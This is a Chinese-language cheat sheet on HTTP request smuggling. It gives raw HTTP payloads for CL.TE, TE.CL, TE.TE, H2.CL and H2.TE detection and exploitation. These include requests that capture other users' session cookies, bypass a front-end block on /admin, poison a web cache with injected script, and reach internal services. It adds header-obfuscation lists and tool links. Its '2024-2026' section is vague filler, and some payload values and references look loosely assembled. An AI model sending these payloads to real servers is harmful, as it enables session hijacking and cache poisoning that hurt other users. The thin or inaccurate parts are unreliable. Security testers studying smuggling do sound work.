# 请求走私 (HTTP Request Smuggling)

## 原理

前后端服务器对 HTTP 请求边界的理解不一致（基于 `Content-Length` 还是 `Transfer-Encoding`），导致攻击者可以"走私"一个请求，影响其他用户的请求。

## 分类

| 类型 | 说明 |
|------|------|
| CL.TE | 前端用 Content-Length，后端用 Transfer-Encoding |
| TE.CL | 前端用 Transfer-Encoding，后端用 Content-Length |
| TE.TE | 两端都用 Transfer-Encoding，但通过混淆绕过其中一端 |
| CL.CL | 两端都用 Content-Length，但值不同 |
| H2.CL | HTTP/2 降级到 HTTP/1.1 时的走私 |
| H2.TE | HTTP/2 降级时的 Transfer-Encoding 走私 |

## 攻击链

### 1. 探测走私

```http
# CL.TE 探测
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

0

G
# 如果前端用 CL，会发送完整请求
# 后端用 TE，遇到 0\r\n\r\n 结束，G 被当作下一个请求
# 如果响应 404 或超时，说明存在 CL.TE
```

```http
# TE.CL 探测
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

5e
POST / HTTP/1.1
Host: target.com
Content-Length: 10

0

# 如果前端用 TE，发送完整请求
# 后端用 CL，只读 4 字节，剩余作为下一个请求
```

### 2. CL.TE 走私

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
# 前端用 CL，发送 13 字节
# 后端用 TE，遇到 0\r\n\r\n 结束
# "SMUGGLED" 被当作下一个请求的开头
```

### 3. TE.CL 走私

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0

# 前端用 TE，发送完整请求
# 后端用 CL，只读 3 字节
# 剩余作为下一个请求
```

### 4. TE.TE 走私（混淆）

```http
# 通过混淆 Transfer-Encoding 头绕过其中一端
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
X: x
Transfer-Encoding: chunked
Transfer-Encoding: chunked, cow
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
Transfer-Encoding: chunked
X: \nTransfer-Encoding: chunked

# 各种变体
Transfer-Encoding: chunked\r\nTransfer-Encoding: cow
```

### 5. H2.CL 走私（HTTP/2）

```http
# HTTP/2 请求降级到 HTTP/1.1
# 前端用 HTTP/2，后端用 HTTP/1.1
# 通过 Content-Length 操纵

POST / HTTP/2
Host: target.com
Content-Length: 0

SMUGGLED
# HTTP/2 不使用 Content-Length，但后端会读取
```

### 6. H2.TE 走私

```http
# HTTP/2 中注入 Transfer-Encoding 头
POST / HTTP/2
Host: target.com
Transfer-Encoding: chunked

0

SMUGGLED
```

## 利用场景

### 1. 窃取其他用户的请求

```http
# 攻击者发送
POST / HTTP/1.1
Host: target.com
Content-Length: 200
Connection: keep-alive
Transfer-Encoding: chunked

0

POST /capture HTTP/1.1
Host: target.com
Content-Length: 100
Cookie: 

# 受害者发送
GET / HTTP/1.1
Host: target.com
Cookie: session=victim_session

# 受害者的请求被附加到攻击者的 POST /capture 请求中
# 攻击者可以读取 /capture 的日志获取受害者 Cookie
```

### 2. 绕过前端安全控制

```http
# 前端禁止访问 /admin
# 通过走私绕过

POST / HTTP/1.1
Host: target.com
Content-Length: 40
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: target.com

# 后端会执行 GET /admin
```

### 3. Web 缓存投毒

```http
# 攻击者发送
POST / HTTP/1.1
Host: target.com
Content-Length: 300
Transfer-Encoding: chunked

0

GET /poisoned HTTP/1.1
Host: target.com
Content-Length: 200

HTTP/1.1 200 OK
Content-Length: 100

<script>alert(1)</script>

# 受害者请求
GET / HTTP/1.1
Host: target.com

# 受害者的响应被替换为攻击者的恶意内容
# 缓存被投毒
```

### 4. XSS 利用

```http
# 通过走私注入恶意响应
# 影响其他用户
```

### 5. SSRF

```http
# 通过走私访问内网
POST / HTTP/1.1
Host: target.com
Content-Length: 100
Transfer-Encoding: chunked

0

GET http://internal-service/ HTTP/1.1
Host: target.com
```

## 绕过技巧

### 1. Transfer-Encoding 混淆

```http
# 各种变体
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: cow
Transfer-Encoding: chunked
Transfer-Encoding: cow
Transfer-Encoding: chunked, cow
Transfer-Encoding: cow, chunked
Transfer-Encoding: chunked
Transfer-Encoding: identity
Transfer-Encoding: chunked
X: x
```

### 2. Content-Length 混淆

```http
# 多个 Content-Length
Content-Length: 0
Content-Length: 100
# 不同服务器处理不同
```

### 3. Connection 头

```http
# Connection: close
# 强制关闭连接
# 但某些服务器会忽略
```

### 4. HTTP/2 特性

```http
# HTTP/2 的 :authority 伪头
# HTTP/2 的连接合并
# HTTP/2 的流优先级
```

## 2024-2026 新技术点

### 1. HTTP/2 走私新变种

```http
# H2.H2 走私
# HTTP/2 到 HTTP/2 的走私
# 通过流复用

# HTTP/2 到 HTTP/3 降级
# 新的走私场景
```

### 2. HTTP/3 (QUIC) 走私

```http
# HTTP/3 基于 QUIC
# 新的请求边界处理
# 可能存在新的走私
```

### 3. CDN 新特性

```http
# Cloudflare, AWS CloudFront, Akamai
# 新的缓存策略
# 新的走私场景
```

### 4. WebSocket 升级走私

```http
# 通过 WebSocket 升级请求走私
# Connection: Upgrade
# Upgrade: websocket
```

### 5. Server-Sent Events 走私

```http
# 通过 SSE 走私
# Content-Type: text/event-stream
```

### 6. gRPC 走私

```http
# gRPC 基于 HTTP/2
# 通过 gRPC 走私
# Content-Type: application/grpc
```

### 7. GraphQL 走私

```http
# 通过 GraphQL 批量查询走私
# 通过持久化查询
```

### 8. 现代 Web 服务器新漏洞

```http
# Nginx 1.25+ HTTP/3 支持
# Apache 2.4 新特性
# Caddy 新特性
# 各服务器的新走私场景
```

### 9. 容器环境走私

```http
# Kubernetes Ingress Controller
# Service Mesh (Istio, Linkerd)
# API Gateway
```

### 10. Serverless 走私

```http
# AWS API Gateway + Lambda
# Cloudflare Workers
# Vercel Edge Functions
# 各 Serverless 平台的走私
```

## 工具推荐

- **Burp Suite** — 手动测试
- **HTTP Request Smuggler** (Burp 插件) — 自动化
- **smugglefuzz** — 走私 fuzz
- **TReqs** — HTTP/2 测试
- **h2csmuggler** — HTTP/2 走私

## 参考链接

- [PortSwigger HTTP Request Smuggling](https://portswigger.net/web-security/request-smuggling)
- [HTTP Request Smuggling James Kettle](https://snyk.io/blog/http-request-smuggling/)
- [HTTP/2 Smuggling](https://labs.bishopfox.com/tech-blog/http2-request-smuggling)
- [PayloadsAllTheThings - Smuggling](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/HTTP%20Request%20Smuggling)
